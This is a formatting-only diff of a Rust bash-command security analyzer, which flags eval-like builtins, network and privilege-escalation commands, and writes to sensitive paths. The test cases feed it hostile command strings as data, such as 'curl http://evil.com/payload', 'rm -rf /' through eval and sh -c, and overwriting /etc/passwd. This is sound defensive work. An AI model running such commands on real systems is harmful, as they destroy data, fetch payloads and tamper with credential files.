@@ -13,7 +13,7 @@ use std::time::{Duration, Instant};
 const EVAL_LIKE_BUILTINS: &[&str] = &[
     "eval",
     "source",
-    ".",       // alias for source
+    ".", // alias for source
     "exec",
     "command",
     "builtin",
@@ -33,23 +33,8 @@ const EVAL_LIKE_BUILTINS: &[&str] = &[
 
 /// Zsh-specific dangerous builtins.
 const ZSH_DANGEROUS_BUILTINS: &[&str] = &[
-    "zmodload",
-    "emulate",
-    "sysopen",
-    "sysread",
-    "syswrite",
-    "sysseek",
-    "zpty",
-    "ztcp",
-    "zsocket",
-    "zf_rm",
-    "zf_mv",
-    "zf_ln",
-    "zf_chmod",
-    "zf_chown",
-    "zf_mkdir",
-    "zf_rmdir",
-    "zf_chgrp",
+    "zmodload", "emulate", "sysopen", "sysread", "syswrite", "sysseek", "zpty", "ztcp", "zsocket",
+    "zf_rm", "zf_mv", "zf_ln", "zf_chmod", "zf_chown", "zf_mkdir", "zf_rmdir", "zf_chgrp",
 ];
 
 /// Process wrappers stripped before checking the real command.
@@ -276,7 +261,10 @@ pub fn analyze_command(command: &str) -> BashSecurityAnalysis {
     if node_count > MAX_NODE_COUNT {
         warnings.push(BashWarning {
             kind: BashWarningKind::AnalysisBudgetExceeded,
-            detail: format!("AST node count {} exceeded budget {}", node_count, MAX_NODE_COUNT),
+            detail: format!(
+                "AST node count {} exceeded budget {}",
+                node_count, MAX_NODE_COUNT
+            ),
         });
         let elapsed = start_time.elapsed().as_millis() as u64;
         return BashSecurityAnalysis {
@@ -299,7 +287,10 @@ pub fn analyze_command(command: &str) -> BashSecurityAnalysis {
         if EVAL_LIKE_BUILTINS.iter().any(|b| *b == name_lower) {
             warnings.push(BashWarning {
                 kind: BashWarningKind::EvalLikeBuiltin,
-                detail: format!("command '{}' is an eval-like builtin that can execute arbitrary code", name),
+                detail: format!(
+                    "command '{}' is an eval-like builtin that can execute arbitrary code",
+                    name
+                ),
             });
         }
 
@@ -407,9 +398,16 @@ fn walk_node_with_budget(
 
     match kind {
         // Safe structural nodes — recurse into children
-        "program" | "list" | "pipeline" | "redirected_statement" | "command"
-        | "command_name" | "concatenation" | "variable_assignment"
-        | "declaration_command" | "file_redirect" => {
+        "program"
+        | "list"
+        | "pipeline"
+        | "redirected_statement"
+        | "command"
+        | "command_name"
+        | "concatenation"
+        | "variable_assignment"
+        | "declaration_command"
+        | "file_redirect" => {
             for i in 0..node.child_count() {
                 if let Some(child) = node.child(i as u32) {
                     walk_node_with_budget(&child, source, warnings, node_count);
@@ -516,9 +514,18 @@ fn walk_node_with_budget(
         }
 
         // Known safe leaf/structural nodes — no action needed
-        "word" | "string" | "raw_string" | "simple_expansion" | "number"
-        | "special_variable_name" | "environment_variable" | "test_operator"
-        | "unsetting_command" | "heredoc_body" | "heredoc_start" | "heredoc_end" => {}
+        "word"
+        | "string"
+        | "raw_string"
+        | "simple_expansion"
+        | "number"
+        | "special_variable_name"
+        | "environment_variable"
+        | "test_operator"
+        | "unsetting_command"
+        | "heredoc_body"
+        | "heredoc_start"
+        | "heredoc_end" => {}
 
         // Fail-closed: unknown node types
         _ => {
@@ -535,7 +542,10 @@ fn walk_node_with_budget(
 
 // ---- Command extraction + wrapper stripping ----
 
-fn extract_and_strip_command(root: &tree_sitter::Node, source: &str) -> (Option<String>, Vec<String>) {
+fn extract_and_strip_command(
+    root: &tree_sitter::Node,
+    source: &str,
+) -> (Option<String>, Vec<String>) {
     let commands = collect_commands(root, source);
     let Some((name, args)) = commands.first() else {
         return (extract_command_name_fallback(source), vec![]);
@@ -568,9 +578,18 @@ fn collect_commands_recursive(
                 commands.push(cmd);
             }
         }
-        "program" | "list" | "pipeline" | "redirected_statement" | "subshell"
-        | "compound_statement" | "if_statement" | "for_statement" | "while_statement"
-        | "until_statement" | "case_statement" | "function_definition" => {
+        "program"
+        | "list"
+        | "pipeline"
+        | "redirected_statement"
+        | "subshell"
+        | "compound_statement"
+        | "if_statement"
+        | "for_statement"
+        | "while_statement"
+        | "until_statement"
+        | "case_statement"
+        | "function_definition" => {
             for i in 0..node.child_count() {
                 if let Some(child) = node.child(i as u32) {
                     collect_commands_recursive(&child, source, commands);
@@ -594,8 +613,8 @@ fn extract_command_from_node(
             "command_name" => {
                 name = Some(node_text(&child, source));
             }
-            "word" | "string" | "raw_string" | "number" | "simple_expansion"
-            | "concatenation" | "expansion" => {
+            "word" | "string" | "raw_string" | "number" | "simple_expansion" | "concatenation"
+            | "expansion" => {
                 let text = node_text(&child, source);
                 if !text.is_empty() {
                     args.push(text);
@@ -655,12 +674,17 @@ fn strip_wrappers<'a>(name: &'a str, args: &'a [String]) -> (&'a str, &'a [Strin
             // nice [-n N] COMMAND or nice [-N] COMMAND
             if args.len() >= 2 && (args[0] == "-n" && args[1].parse::<i32>().is_ok()) {
                 strip_wrappers(&args[2], &args[3..])
-            } else if !args.is_empty() && args[0].starts_with('-') && args[0].len() > 1
+            } else if !args.is_empty()
+                && args[0].starts_with('-')
+                && args[0].len() > 1
                 && args[0][1..].parse::<i32>().is_ok()
             {
                 strip_wrappers(&args[1], &args[2..])
             } else {
-                strip_wrappers(&args.first().map(|s| s.as_str()).unwrap_or(name), &args.get(1..).unwrap_or(args))
+                strip_wrappers(
+                    &args.first().map(|s| s.as_str()).unwrap_or(name),
+                    &args.get(1..).unwrap_or(args),
+                )
             }
         }
         "stdbuf" | "env" => {
@@ -728,8 +752,13 @@ fn determine_verdict(warnings: &[BashWarning]) -> BashVerdict {
 
     // Hard deny: eval-like, zsh dangerous, parse failure, unknown nodes, budget exceeded,
     // redirect to sensitive path, variable as command
-    if has_eval || has_zsh || has_parse_fail || has_unknown || has_budget_exceeded
-        || has_redirect_sensitive || has_variable_as_command
+    if has_eval
+        || has_zsh
+        || has_parse_fail
+        || has_unknown
+        || has_budget_exceeded
+        || has_redirect_sensitive
+        || has_variable_as_command
     {
         return BashVerdict::Deny;
     }
@@ -784,7 +813,9 @@ fn check_redirects_node(node: &tree_sitter::Node, source: &str, warnings: &mut V
 
         if let Some(path) = target_path {
             let path_lower = path.to_ascii_lowercase();
-            let is_sensitive = SENSITIVE_REDIRECT_PATHS.iter().any(|p| path_lower.starts_with(*p));
+            let is_sensitive = SENSITIVE_REDIRECT_PATHS
+                .iter()
+                .any(|p| path_lower.starts_with(*p));
             if is_sensitive {
                 let op = redirect_op.as_deref().unwrap_or(">");
                 let is_overwrite = op.contains('>') && !op.contains(">>");
@@ -826,7 +857,10 @@ fn check_variable_command_node(node: &tree_sitter::Node, warnings: &mut Vec<Bash
                             if kind == "simple_expansion" || kind == "expansion" {
                                 warnings.push(BashWarning {
                                     kind: BashWarningKind::VariableAsCommand,
-                                    detail: format!("command name is a variable expansion: {}", kind),
+                                    detail: format!(
+                                        "command name is a variable expansion: {}",
+                                        kind
+                                    ),
                                 });
                             }
                         }
@@ -886,7 +920,12 @@ fn check_suspicious_arguments_node(
                         if i + 1 < args.len() {
                             warnings.push(BashWarning {
                                 kind: BashWarningKind::SuspiciousArguments,
-                                detail: format!("{} {} '{}' may execute arbitrary code", name, arg, args[i + 1]),
+                                detail: format!(
+                                    "{} {} '{}' may execute arbitrary code",
+                                    name,
+                                    arg,
+                                    args[i + 1]
+                                ),
                             });
                         }
                     }
@@ -900,7 +939,11 @@ fn check_suspicious_arguments_node(
                         if i + 1 < args.len() {
                             warnings.push(BashWarning {
                                 kind: BashWarningKind::SuspiciousArguments,
-                                detail: format!("{} -c '{}' executes shell code", name, args[i + 1]),
+                                detail: format!(
+                                    "{} -c '{}' executes shell code",
+                                    name,
+                                    args[i + 1]
+                                ),
                             });
                         }
                     }
@@ -941,7 +984,10 @@ fn check_network_commands(command_name: &str) -> Vec<BashWarning> {
 
 fn check_privilege_escalation(command_name: &str) -> Vec<BashWarning> {
     let mut warnings = Vec::new();
-    if PRIVILEGE_ESCALATION_COMMANDS.iter().any(|c| *c == command_name) {
+    if PRIVILEGE_ESCALATION_COMMANDS
+        .iter()
+        .any(|c| *c == command_name)
+    {
         warnings.push(BashWarning {
             kind: BashWarningKind::PrivilegeEscalation,
             detail: format!("privilege escalation: {}", command_name),
@@ -952,11 +998,16 @@ fn check_privilege_escalation(command_name: &str) -> Vec<BashWarning> {
 
 fn check_permission_modification(command_name: &str, args: &[String]) -> Vec<BashWarning> {
     let mut warnings = Vec::new();
-    if PERMISSION_MODIFICATION_COMMANDS.iter().any(|c| *c == command_name) {
+    if PERMISSION_MODIFICATION_COMMANDS
+        .iter()
+        .any(|c| *c == command_name)
+    {
         // Check if any argument targets a sensitive path
         let has_sensitive_target = args.iter().any(|arg| {
             let arg_lower = arg.to_ascii_lowercase();
-            SENSITIVE_REDIRECT_PATHS.iter().any(|p| arg_lower.starts_with(*p))
+            SENSITIVE_REDIRECT_PATHS
+                .iter()
+                .any(|p| arg_lower.starts_with(*p))
         });
         if has_sensitive_target {
             warnings.push(BashWarning {
@@ -1013,8 +1064,17 @@ mod tests {
         let cases = ["ls -la", "echo hello", "pwd", "cat file.txt", "git status"];
         for cmd in cases {
             let analysis = analyze_command(cmd);
-            assert_eq!(analysis.verdict, BashVerdict::Safe, "expected safe: {}", cmd);
-            assert!(analysis.warnings.is_empty(), "unexpected warnings for: {}", cmd);
+            assert_eq!(
+                analysis.verdict,
+                BashVerdict::Safe,
+                "expected safe: {}",
+                cmd
+            );
+            assert!(
+                analysis.warnings.is_empty(),
+                "unexpected warnings for: {}",
+                cmd
+            );
         }
     }
 
@@ -1024,7 +1084,10 @@ mod tests {
     fn detects_eval() {
         let analysis = analyze_command("eval 'cat /etc/passwd'");
         assert_eq!(analysis.verdict, BashVerdict::Deny);
-        assert!(analysis.warnings.iter().any(|w| w.kind == BashWarningKind::EvalLikeBuiltin));
+        assert!(analysis
+            .warnings
+            .iter()
+            .any(|w| w.kind == BashWarningKind::EvalLikeBuiltin));
         assert_eq!(analysis.command_name.as_deref(), Some("eval"));
     }
 
@@ -1032,14 +1095,20 @@ mod tests {
     fn detects_source() {
         let analysis = analyze_command("source malicious.sh");
         assert_eq!(analysis.verdict, BashVerdict::Deny);
-        assert!(analysis.warnings.iter().any(|w| w.kind == BashWarningKind::EvalLikeBuiltin));
+        assert!(analysis
+            .warnings
+            .iter()
+            .any(|w| w.kind == BashWarningKind::EvalLikeBuiltin));
     }
 
     #[test]
     fn detects_exec() {
         let analysis = analyze_command("exec /bin/bash");
         assert_eq!(analysis.verdict, BashVerdict::Deny);
-        assert!(analysis.warnings.iter().any(|w| w.kind == BashWarningKind::EvalLikeBuiltin));
+        assert!(analysis
+            .warnings
+            .iter()
+            .any(|w| w.kind == BashWarningKind::EvalLikeBuiltin));
     }
 
     #[test]
@@ -1055,7 +1124,10 @@ mod tests {
     fn detects_zsh_dangerous() {
         let analysis = analyze_command("zmodload zsh/system");
         assert_eq!(analysis.verdict, BashVerdict::Deny);
-        assert!(analysis.warnings.iter().any(|w| w.kind == BashWarningKind::ZshDangerous));
+        assert!(analysis
+            .warnings
+            .iter()
+            .any(|w| w.kind == BashWarningKind::ZshDangerous));
     }
 
     // ---- Command substitution ----
@@ -1063,14 +1135,20 @@ mod tests {
     #[test]
     fn detects_command_substitution() {
         let analysis = analyze_command("echo $(whoami)");
-        assert!(analysis.warnings.iter().any(|w| w.kind == BashWarningKind::CommandSubstitution));
+        assert!(analysis
+            .warnings
+            .iter()
+            .any(|w| w.kind == BashWarningKind::CommandSubstitution));
         assert!(analysis.is_dangerous());
     }
 
     #[test]
     fn detects_backtick_substitution() {
         let analysis = analyze_command("echo `whoami`");
-        assert!(analysis.warnings.iter().any(|w| w.kind == BashWarningKind::CommandSubstitution));
+        assert!(analysis
+            .warnings
+            .iter()
+            .any(|w| w.kind == BashWarningKind::CommandSubstitution));
     }
 
     // ---- Wrapper stripping ----
@@ -1092,7 +1170,10 @@ mod tests {
         let analysis = analyze_command("nohup eval 'rm -rf /'");
         assert_eq!(analysis.verdict, BashVerdict::Deny);
         assert_eq!(analysis.command_name.as_deref(), Some("eval"));
-        assert!(analysis.warnings.iter().any(|w| w.kind == BashWarningKind::EvalLikeBuiltin));
+        assert!(analysis
+            .warnings
+            .iter()
+            .any(|w| w.kind == BashWarningKind::EvalLikeBuiltin));
     }
 
     #[test]
@@ -1106,25 +1187,37 @@ mod tests {
     #[test]
     fn detects_subshell() {
         let analysis = analyze_command("(cd /tmp && rm -rf *)");
-        assert!(analysis.warnings.iter().any(|w| w.kind == BashWarningKind::ComplexConstruct));
+        assert!(analysis
+            .warnings
+            .iter()
+            .any(|w| w.kind == BashWarningKind::ComplexConstruct));
     }
 
     #[test]
     fn detects_if_statement() {
         let analysis = analyze_command("if true; then echo yes; fi");
-        assert!(analysis.warnings.iter().any(|w| w.kind == BashWarningKind::ControlFlow));
+        assert!(analysis
+            .warnings
+            .iter()
+            .any(|w| w.kind == BashWarningKind::ControlFlow));
     }
 
     #[test]
     fn detects_for_loop() {
         let analysis = analyze_command("for i in 1 2 3; do echo $i; done");
-        assert!(analysis.warnings.iter().any(|w| w.kind == BashWarningKind::ControlFlow));
+        assert!(analysis
+            .warnings
+            .iter()
+            .any(|w| w.kind == BashWarningKind::ControlFlow));
     }
 
     #[test]
     fn detects_function_definition() {
         let analysis = analyze_command("foo() { echo bar; }");
-        assert!(analysis.warnings.iter().any(|w| w.kind == BashWarningKind::ComplexConstruct));
+        assert!(analysis
+            .warnings
+            .iter()
+            .any(|w| w.kind == BashWarningKind::ComplexConstruct));
     }
 
     // ---- Heredoc ----
@@ -1132,7 +1225,10 @@ mod tests {
     #[test]
     fn detects_heredoc() {
         let analysis = analyze_command("cat <<EOF\nhello\nEOF");
-        assert!(analysis.warnings.iter().any(|w| w.kind == BashWarningKind::Heredoc));
+        assert!(analysis
+            .warnings
+            .iter()
+            .any(|w| w.kind == BashWarningKind::Heredoc));
     }
 
     // ---- Process substitution ----
@@ -1140,7 +1236,10 @@ mod tests {
     #[test]
     fn detects_process_substitution() {
         let analysis = analyze_command("diff <(ls a) <(ls b)");
-        assert!(analysis.warnings.iter().any(|w| w.kind == BashWarningKind::ProcessSubstitution));
+        assert!(analysis
+            .warnings
+            .iter()
+            .any(|w| w.kind == BashWarningKind::ProcessSubstitution));
     }
 
     // ---- Brace expansion ----
@@ -1148,7 +1247,10 @@ mod tests {
     #[test]
     fn detects_brace_expansion() {
         let analysis = analyze_command("echo {1..5}");
-        assert!(analysis.warnings.iter().any(|w| w.kind == BashWarningKind::BraceExpansion));
+        assert!(analysis
+            .warnings
+            .iter()
+            .any(|w| w.kind == BashWarningKind::BraceExpansion));
     }
 
     // ---- Analysis summary ----
@@ -1186,21 +1288,30 @@ mod tests {
     fn test_redirect_to_sensitive_path() {
         let analysis = analyze_command("echo hacked > /etc/passwd");
         assert_eq!(analysis.verdict, BashVerdict::Deny);
-        assert!(analysis.warnings.iter().any(|w| w.kind == BashWarningKind::RedirectToSensitivePath));
+        assert!(analysis
+            .warnings
+            .iter()
+            .any(|w| w.kind == BashWarningKind::RedirectToSensitivePath));
     }
 
     #[test]
     fn test_redirect_append_sensitive_path() {
         let analysis = analyze_command("echo data >> /etc/shadow");
         assert_eq!(analysis.verdict, BashVerdict::Deny);
-        assert!(analysis.warnings.iter().any(|w| w.kind == BashWarningKind::RedirectToSensitivePath));
+        assert!(analysis
+            .warnings
+            .iter()
+            .any(|w| w.kind == BashWarningKind::RedirectToSensitivePath));
     }
 
     #[test]
     fn test_redirect_safe_path() {
         let analysis = analyze_command("echo hello > /tmp/output.txt");
         assert_eq!(analysis.verdict, BashVerdict::Safe);
-        assert!(!analysis.warnings.iter().any(|w| w.kind == BashWarningKind::RedirectToSensitivePath));
+        assert!(!analysis
+            .warnings
+            .iter()
+            .any(|w| w.kind == BashWarningKind::RedirectToSensitivePath));
     }
 
     // ---- Phase 2: Variable-as-Command ----
@@ -1209,14 +1320,20 @@ mod tests {
     fn test_variable_as_command() {
         let analysis = analyze_command("$cmd arg1 arg2");
         assert_eq!(analysis.verdict, BashVerdict::Deny);
-        assert!(analysis.warnings.iter().any(|w| w.kind == BashWarningKind::VariableAsCommand));
+        assert!(analysis
+            .warnings
+            .iter()
+            .any(|w| w.kind == BashWarningKind::VariableAsCommand));
     }
 
     #[test]
     fn test_braced_variable_as_command() {
         let analysis = analyze_command("${cmd} arg1");
         assert_eq!(analysis.verdict, BashVerdict::Deny);
-        assert!(analysis.warnings.iter().any(|w| w.kind == BashWarningKind::VariableAsCommand));
+        assert!(analysis
+            .warnings
+            .iter()
+            .any(|w| w.kind == BashWarningKind::VariableAsCommand));
     }
 
     // ---- Phase 2: Suspicious Arguments ----
@@ -1224,26 +1341,38 @@ mod tests {
     #[test]
     fn test_suspicious_python_eval() {
         let analysis = analyze_command("python -c 'import os; os.system(\"rm -rf /\")'");
-        assert!(analysis.warnings.iter().any(|w| w.kind == BashWarningKind::SuspiciousArguments));
+        assert!(analysis
+            .warnings
+            .iter()
+            .any(|w| w.kind == BashWarningKind::SuspiciousArguments));
         assert!(analysis.is_dangerous());
     }
 
     #[test]
     fn test_suspicious_python_dash_e() {
         let analysis = analyze_command("python -e 'print(1)'");
-        assert!(analysis.warnings.iter().any(|w| w.kind == BashWarningKind::SuspiciousArguments));
+        assert!(analysis
+            .warnings
+            .iter()
+            .any(|w| w.kind == BashWarningKind::SuspiciousArguments));
     }
 
     #[test]
     fn test_suspicious_shell_dash_c() {
         let analysis = analyze_command("sh -c 'rm -rf /'");
-        assert!(analysis.warnings.iter().any(|w| w.kind == BashWarningKind::SuspiciousArguments));
+        assert!(analysis
+            .warnings
+            .iter()
+            .any(|w| w.kind == BashWarningKind::SuspiciousArguments));
     }
 
     #[test]
     fn test_suspicious_find_exec() {
         let analysis = analyze_command("find / -exec rm {} \\;");
-        assert!(analysis.warnings.iter().any(|w| w.kind == BashWarningKind::SuspiciousArguments));
+        assert!(analysis
+            .warnings
+            .iter()
+            .any(|w| w.kind == BashWarningKind::SuspiciousArguments));
     }
 
     // ---- Phase 2: Network Commands ----
@@ -1251,20 +1380,29 @@ mod tests {
     #[test]
     fn test_network_command_curl() {
         let analysis = analyze_command("curl http://evil.com/payload");
-        assert!(analysis.warnings.iter().any(|w| w.kind == BashWarningKind::NetworkCommand));
+        assert!(analysis
+            .warnings
+            .iter()
+            .any(|w| w.kind == BashWarningKind::NetworkCommand));
         assert!(analysis.is_dangerous());
     }
 
     #[test]
     fn test_network_command_wget() {
         let analysis = analyze_command("wget http://example.com/file");
-        assert!(analysis.warnings.iter().any(|w| w.kind == BashWarningKind::NetworkCommand));
+        assert!(analysis
+            .warnings
+            .iter()
+            .any(|w| w.kind == BashWarningKind::NetworkCommand));
     }
 
     #[test]
     fn test_network_command_ssh() {
         let analysis = analyze_command("ssh user@host");
-        assert!(analysis.warnings.iter().any(|w| w.kind == BashWarningKind::NetworkCommand));
+        assert!(analysis
+            .warnings
+            .iter()
+            .any(|w| w.kind == BashWarningKind::NetworkCommand));
     }
 
     // ---- Phase 2: Privilege Escalation ----
@@ -1272,20 +1410,29 @@ mod tests {
     #[test]
     fn test_privilege_escalation_sudo() {
         let analysis = analyze_command("sudo rm -rf /");
-        assert!(analysis.warnings.iter().any(|w| w.kind == BashWarningKind::PrivilegeEscalation));
+        assert!(analysis
+            .warnings
+            .iter()
+            .any(|w| w.kind == BashWarningKind::PrivilegeEscalation));
         assert!(analysis.is_dangerous());
     }
 
     #[test]
     fn test_privilege_escalation_su() {
         let analysis = analyze_command("su - root");
-        assert!(analysis.warnings.iter().any(|w| w.kind == BashWarningKind::PrivilegeEscalation));
+        assert!(analysis
+            .warnings
+            .iter()
+            .any(|w| w.kind == BashWarningKind::PrivilegeEscalation));
     }
 
     #[test]
     fn test_privilege_escalation_doas() {
         let analysis = analyze_command("doas ls /root");
-        assert!(analysis.warnings.iter().any(|w| w.kind == BashWarningKind::PrivilegeEscalation));
+        assert!(analysis
+            .warnings
+            .iter()
+            .any(|w| w.kind == BashWarningKind::PrivilegeEscalation));
     }
 
     // ---- Phase 2: Permission Modification ----
@@ -1293,7 +1440,10 @@ mod tests {
     #[test]
     fn test_permission_modification() {
         let analysis = analyze_command("chmod 777 /etc/shadow");
-        assert!(analysis.warnings.iter().any(|w| w.kind == BashWarningKind::PermissionModification));
+        assert!(analysis
+            .warnings
+            .iter()
+            .any(|w| w.kind == BashWarningKind::PermissionModification));
         assert!(analysis.is_dangerous());
     }
 
@@ -1301,13 +1451,19 @@ mod tests {
     fn test_permission_modification_safe_path() {
         let analysis = analyze_command("chmod 755 /tmp/script.sh");
         // Safe path — no warning
-        assert!(!analysis.warnings.iter().any(|w| w.kind == BashWarningKind::PermissionModification));
+        assert!(!analysis
+            .warnings
+            .iter()
+            .any(|w| w.kind == BashWarningKind::PermissionModification));
     }
 
     #[test]
     fn test_chown_sensitive() {
         let analysis = analyze_command("chown root:root /etc/passwd");
-        assert!(analysis.warnings.iter().any(|w| w.kind == BashWarningKind::PermissionModification));
+        assert!(analysis
+            .warnings
+            .iter()
+            .any(|w| w.kind == BashWarningKind::PermissionModification));
     }
 
     // ---- Phase 2: Timeout and Node Budget ----
@@ -1325,20 +1481,29 @@ mod tests {
     #[test]
     fn test_heredoc_with_expansion() {
         let analysis = analyze_command("cat << EOF\n$(dangerous)\nEOF");
-        assert!(analysis.warnings.iter().any(|w| w.kind == BashWarningKind::HeredocExpansion));
+        assert!(analysis
+            .warnings
+            .iter()
+            .any(|w| w.kind == BashWarningKind::HeredocExpansion));
         assert!(analysis.is_dangerous());
     }
 
     #[test]
     fn test_heredoc_with_variable_expansion() {
         let analysis = analyze_command("cat << EOF\n$HOME\nEOF");
-        assert!(analysis.warnings.iter().any(|w| w.kind == BashWarningKind::HeredocExpansion));
+        assert!(analysis
+            .warnings
+            .iter()
+            .any(|w| w.kind == BashWarningKind::HeredocExpansion));
     }
 
     #[test]
     fn test_heredoc_without_expansion() {
         let analysis = analyze_command("cat << 'EOF'\nhello world\nEOF");
         // No expansion in quoted heredoc
-        assert!(!analysis.warnings.iter().any(|w| w.kind == BashWarningKind::HeredocExpansion));
+        assert!(!analysis
+            .warnings
+            .iter()
+            .any(|w| w.kind == BashWarningKind::HeredocExpansion));
     }
 }
